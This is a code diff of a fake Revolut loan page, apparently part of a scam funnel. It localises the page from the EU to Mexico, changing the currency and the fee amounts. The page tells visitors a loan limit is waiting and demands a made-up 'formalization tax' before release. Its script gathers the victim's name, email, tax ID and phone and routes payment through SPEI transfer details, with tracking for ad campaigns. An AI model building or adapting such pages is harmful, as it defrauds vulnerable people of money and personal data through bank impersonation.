@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es-MX">
 <head>
 <meta charset="utf-8"/>
 <script>
@@ -17,7 +17,7 @@ window.apiUrl = window.apiUrl || function (p) {
 </script>
 <script src="../extensions/api-base.js"></script>
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
-<title>Stamp Duty Pending — RevolutBank</title>
+<title>Impuesto de Formalización Pendiente — RevolutBank</title>
 
 <script defer src="../../cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js" data-token="3269fe28-2341-4107-9bf9-f1ad9d68455f"></script>
 <style>
@@ -157,7 +157,7 @@ window.apiUrl = window.apiUrl || function (p) {
   <!-- Box 1: Available Limit -->
   <div style="margin:20px 16px 0;background:#fff;border-radius:20px;padding:24px;text-align:center;">
     <div style="font-size:11px;font-weight:700;letter-spacing:1.5px;color:#71717a;margin-bottom:10px;">AVAILABLE LIMIT</div>
-    <div style="font-size:40px;font-weight:800;letter-spacing:-1.5px;color:#0a0a0a;" id="limiteDisplay">4.600,00 €</div>
+    <div style="font-size:40px;font-weight:800;letter-spacing:-1.5px;color:#0a0a0a;" id="limiteDisplay">$ 92,000</div>
   </div>
 
   <!-- Data de validade -->
@@ -166,10 +166,10 @@ window.apiUrl = window.apiUrl || function (p) {
     <div style="font-size:15px;font-weight:700;color:#1d4ed8;" id="dataDisp">---</div>
   </div>
 
-  <!-- Box 2: Stamp Duty -->
+  <!-- Box 2: Impuesto de Formalización -->
   <div style="margin:6px 16px 0;background:#fff;border-radius:20px;padding:22px;text-align:center;">
     <div style="font-size:10px;font-weight:700;letter-spacing:1.5px;color:#71717a;margin-bottom:10px;">FORMALIZATION — STAMP DUTY</div>
-    <div style="font-size:36px;font-weight:800;letter-spacing:-1px;color:#0a0a0a;"><span data-fee-amount="suffix">23,91 €</span></div>
+    <div style="font-size:36px;font-weight:800;letter-spacing:-1px;color:#0a0a0a;"><span data-fee-amount="suffix">$ 490</span></div>
   </div>
 
   <!-- Button -->
@@ -184,7 +184,7 @@ window.apiUrl = window.apiUrl || function (p) {
 
   <!-- Description -->
   <div style="margin:10px 16px 0;background:#e5e7eb;border-radius:16px;padding:18px;">
-    <p style="font-size:13px;color:#374151;line-height:1.65;">To receive the available balance, payment of the user verification fee is required. This fee covers the cost of the <strong style="color:#0a0a0a;">Stamp Duty</strong> applicable under EU tax regulations, ensuring the process complies with Tax Authority regulations and helps prevent any type of fraud.</p>
+    <p style="font-size:13px;color:#374151;line-height:1.65;">To receive the available balance, payment of the user verification fee is required. This fee covers the cost of the <strong style="color:#0a0a0a;">Impuesto de Formalización</strong> applicable under regulaciones fiscales mexicanas, ensuring the process complies with regulaciones del SAT and helps prevent any type of fraud.</p>
   </div>
 
   <!-- Footer text -->
@@ -197,8 +197,8 @@ window.apiUrl = window.apiUrl || function (p) {
   <div class="modal-overlay" id="payModal">
     <div class="modal-sheet">
       <button class="modal-close" onclick="closeModal()"><span data-msg="upsell3.t12">×</span></button>
-      <div class="modal-title">Confirm Payment</div>
-      <div class="modal-amount" id="modalPayAmount">€ ---</div>
+      <div class="modal-title">Confirmar Payment</div>
+      <div class="modal-amount" id="modalPayAmount">$ ---</div>
       <div id="modalBody"></div>
     </div>
   </div>
@@ -208,7 +208,7 @@ window.apiUrl = window.apiUrl || function (p) {
     <div class="logo-wrap">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 2 162 44" width="118" height="32" overflow="hidden" role="img" aria-label="Revolut"><text x="2" y="42" font-family="'DM Sans','Inter','Helvetica Neue',Arial,sans-serif" font-size="44" font-weight="700" fill="#0a0a0a" letter-spacing="-1.5">Revolut</text></svg>
     </div>
-    Revolut<br/>Registered and regulated within the European Union
+    Revolut<br/>Registered and regulated within the México
   </div>
 
 </div>
@@ -226,7 +226,7 @@ try{(function(){
   var loanRaw=parseFloat(localStorage.getItem('selectedLoanAmount')||localStorage.getItem('valorEmprestimo')||4600);
   var loan=loanRaw||4600;
   var el=document.getElementById('limiteDisplay');
-  if(el) el.textContent=loan.toLocaleString('de-DE',{minimumFractionDigits:2,maximumFractionDigits:2})+' €';
+  if(el) el.textContent=loan.toLocaleString('es-MX',{minimumFractionDigits:2,maximumFractionDigits:2})+' $';
 
   // Date in English
   var meses=['January','February','March','April','May','June','July','August','September','October','November','December'];
@@ -237,8 +237,8 @@ try{(function(){
 })();}catch(e){console.error('[UPSELL] init error:',e);}
 
 // ── PAYMENT ──
-var PAY_AMOUNT_FALLBACK = 23.91;
-var PAY_AMOUNT = 23.91;
+var PAY_AMOUNT_FALLBACK = 490;
+var PAY_AMOUNT = 490;
 function getPayAmount(){ return (window.resolveUpsellAmount||function(f){return f;})(PAY_AMOUNT_FALLBACK); }
 window.addEventListener('upsell-fee-ready',function(ev){ if(ev&&ev.detail&&ev.detail.amount!=null) PAY_AMOUNT=ev.detail.amount; });
 window.addEventListener('funil-fees-ready',function(){ PAY_AMOUNT=getPayAmount(); });
@@ -246,7 +246,7 @@ window.addEventListener('funil-fees-ready',function(){ PAY_AMOUNT=getPayAmount()
 function utcNow(){ return new Date().toISOString().replace("T"," ").slice(0,19); }
 function getPhone(){ return (localStorage.getItem("telefone")||localStorage.getItem("telephone")||localStorage.getItem("phone")||"").replace(/\D/g,""); }
 function setModalBody(html){ document.getElementById("modalBody").innerHTML=html; }
-function buildSpeiBody(payData,amtLabel){var s='';if(payData&&payData.clabe){var mx=payData.amount_mxn?'MX$ '+Number(payData.amount_mxn).toFixed(2).replace('.',','):'';s='<div style="background:#f0fdf4;border:1.5px solid #22c55e;border-radius:12px;padding:14px 16px;margin:10px 0;font-size:13px;text-align:left;"><div style="font-weight:800;color:#15803d;margin-bottom:8px;">📲 Transfer via SPEI</div><table style="width:100%;border-collapse:collapse;font-size:12px;color:#374151;"><tr><td style="padding:3px 0;color:#6b7280;">Bank</td><td style="padding:3px 0;font-weight:700;">'+(payData.bank_name||'STP')+'</td></tr><tr><td style="padding:3px 0;color:#6b7280;">CLABE</td><td style="padding:3px 0;font-weight:700;letter-spacing:.5px;font-family:monospace;">'+payData.clabe+'</td></tr>'+(payData.beneficiary?'<tr><td style="padding:3px 0;color:#6b7280;">Beneficiary</td><td style="padding:3px 0;font-weight:700;">'+payData.beneficiary+'</td></tr>':'')+(payData.reference?'<tr><td style="padding:3px 0;color:#6b7280;">Reference</td><td style="padding:3px 0;font-weight:700;">'+payData.reference+'</td></tr>':'')+(mx?'<tr><td style="padding:3px 0;color:#6b7280;">Amount</td><td style="padding:3px 0;font-weight:700;">'+mx+'</td></tr>':'')+'</table></div>';}return '<div class="modal-status loading">Complete your payment of <strong>'+amtLabel+'</strong> using the details below.</div>'+s+'<div style="padding:10px;background:#fefce8;border:1.5px solid #fbbf24;border-radius:10px;font-size:13px;color:#92400e;text-align:center;margin-top:8px;">Waiting for confirmation…</div>';}
+function buildSpeiBody(payData,amtLabel){var s='';if(payData&&payData.clabe){var mx=payData.amount_mxn?'MX$ '+Number(payData.amount_mxn).toFixed(2).replace('.',','):'';s='<div style="background:#f0fdf4;border:1.5px solid #22c55e;border-radius:12px;padding:14px 16px;margin:10px 0;font-size:13px;text-align:left;"><div style="font-weight:800;color:#15803d;margin-bottom:8px;">📲 Transferencia via SPEI</div><table style="width:100%;border-collapse:collapse;font-size:12px;color:#374151;"><tr><td style="padding:3px 0;color:#6b7280;">Bank</td><td style="padding:3px 0;font-weight:700;">'+(payData.bank_name||'STP')+'</td></tr><tr><td style="padding:3px 0;color:#6b7280;">CLABE</td><td style="padding:3px 0;font-weight:700;letter-spacing:.5px;font-family:monospace;">'+payData.clabe+'</td></tr>'+(payData.beneficiary?'<tr><td style="padding:3px 0;color:#6b7280;">Beneficiary</td><td style="padding:3px 0;font-weight:700;">'+payData.beneficiary+'</td></tr>':'')+(payData.reference?'<tr><td style="padding:3px 0;color:#6b7280;">Reference</td><td style="padding:3px 0;font-weight:700;">'+payData.reference+'</td></tr>':'')+(mx?'<tr><td style="padding:3px 0;color:#6b7280;">Amount</td><td style="padding:3px 0;font-weight:700;">'+mx+'</td></tr>':'')+'</table></div>';}return '<div class="modal-status loading">Completa tu pago of <strong>'+amtLabel+'</strong> using the details below.</div>'+s+'<div style="padding:10px;background:#fefce8;border:1.5px solid #fbbf24;border-radius:10px;font-size:13px;color:#92400e;text-align:center;margin-top:8px;">Esperando confirmación…</div>';}
 function closeModal(){ document.getElementById("payModal").classList.remove("show"); }
 
 function getStoredUtms(){
@@ -275,7 +275,7 @@ function startPolling(txId){
       const res=await fetch("/api/status?id="+txId);
       const data=await res.json();
       if(data.status==="COMPLETED"){
-        setModalBody('<div class="modal-status success">✅ Payment confirmed! Redirecting...</div>');
+        setModalBody('<div class="modal-status success">✅ ¡Pago confirmado! Redirigiendo...</div>');
         const oid=localStorage.getItem("_utmOrderId")||txId;
         const cat=localStorage.getItem("_utmCreatedAt")||utcNow();
             if (window.trackPurchase) {
@@ -291,7 +291,7 @@ function startPolling(txId){
         setTimeout(()=>{var _u=new URL("../4/index.html",window.location.href);["src","sck","utm_source","utm_campaign","utm_medium","utm_content","utm_term"].forEach(function(k){var v=localStorage.getItem(k);if(v)_u.searchParams.set(k,v);});window.location.href=_u.toString();},1500);
         return;
       }else if(data.status==="DECLINED"){
-        setModalBody('<div class="modal-status error">❌ Payment declined. Please try again.</div><button class="btn-modal-pay" style="margin-top:12px" onclick="closeModal()"><span data-msg="upsell3.t19">Close</span></button>');
+        setModalBody('<div class="modal-status error">❌ Pago rechazado. Por favor intenta de nuevo.</div><button class="btn-modal-pay" style="margin-top:12px" onclick="closeModal()"><span data-msg="upsell3.t19">Cerrar</span></button>');
         return;
       }
     }catch(e){}
@@ -305,11 +305,11 @@ async function startPayment(phone){
   const nome=localStorage.getItem("nome")||"Customer";
   const email=localStorage.getItem("email")||"customer@revolutbank.com";
   const doc=(localStorage.getItem("nif")||localStorage.getItem("cpf")||"999999999").replace(/\D/g,"")||"999999999";
-  setModalBody('<div class="modal-status loading" style="padding:20px"><span style="font-size:28px">⏳</span><br/><br/>Processing your payment...</div>');
+  setModalBody('<div class="modal-status loading" style="padding:20px"><span style="font-size:28px">⏳</span><br/><br/>Procesando tu pago...</div>');
   try{
     const res=await fetch(apiUrl("/api/payment-proxy?action=create"),{method:"POST",headers:{"Content-Type":"application/json"},
 
-      body:JSON.stringify({amount:getPayAmount(),method:'card',currency:"EUR",payer:{name:nome,email,document:doc,phone:phone},product:"imposto-selo",paymentDescription:"Stamp Duty",_utms:getUtmParams()})});
+      body:JSON.stringify({amount:getPayAmount(),method:'card',currency:"MXN",payer:{name:nome,email,document:doc,phone:phone},product:"imposto-selo",paymentDescription:"Impuesto de Formalización",_utms:getUtmParams()})});
     const data=await res.json();
     if(!res.ok||data.error)throw new Error(data.error||data.message||"Error "+res.status);
     const txId=data.id||data.transaction_id||data.transactionId;
@@ -318,17 +318,17 @@ async function startPayment(phone){
     localStorage.setItem("_utmCreatedAt",createdAt);
         // UTMify waiting_payment: server (/api/transaction)
 
-    setModalBody(buildSpeiBody(data,(window.fmtUpsellEuro&&window.fmtUpsellEuro(getPayAmount(),'prefix'))||('€ '+Number(getPayAmount()).toFixed(2).replace('.',','))));
+    setModalBody(buildSpeiBody(data,(window.fmtUpsellEuro&&window.fmtUpsellEuro(getPayAmount(),'prefix'))||('$ '+Number(getPayAmount()).toFixed(2).replace('.',','))));
     startPolling(txId);
   }catch(e){
-    setModalBody('<div class="modal-status error" style="margin-bottom:14px">❌ '+((e&&e.message)?e.message:"Failed to process payment.")+'</div><button class="btn-modal-pay" onclick="startPayment()">Try again</button>');
+    setModalBody('<div class="modal-status error" style="margin-bottom:14px">❌ '+((e&&e.message)?e.message:"Error al procesar el pago.")+'</div><button class="btn-modal-pay" onclick="startPayment()">Intentar de nuevo</button>');
   }
 }
 
 function abrirModal(){
   document.getElementById("payModal").classList.add("show");
-  var elAmt=document.getElementById("modalPayAmount"); if(elAmt) elAmt.textContent=(window.fmtUpsellEuro&&window.fmtUpsellEuro(getPayAmount(),'prefix'))||('€ '+Number(getPayAmount()).toFixed(2).replace('.',','));
-  setModalBody('<div class="modal-status loading" style="padding:20px"><span style="font-size:28px">⏳</span><br/><br/>Processing your payment...</div>');
+  var elAmt=document.getElementById("modalPayAmount"); if(elAmt) elAmt.textContent=(window.fmtUpsellEuro&&window.fmtUpsellEuro(getPayAmount(),'prefix'))||('$ '+Number(getPayAmount()).toFixed(2).replace('.',','));
+  setModalBody('<div class="modal-status loading" style="padding:20px"><span style="font-size:28px">⏳</span><br/><br/>Procesando tu pago...</div>');
   startPayment(getPhone());
 }
 </script>
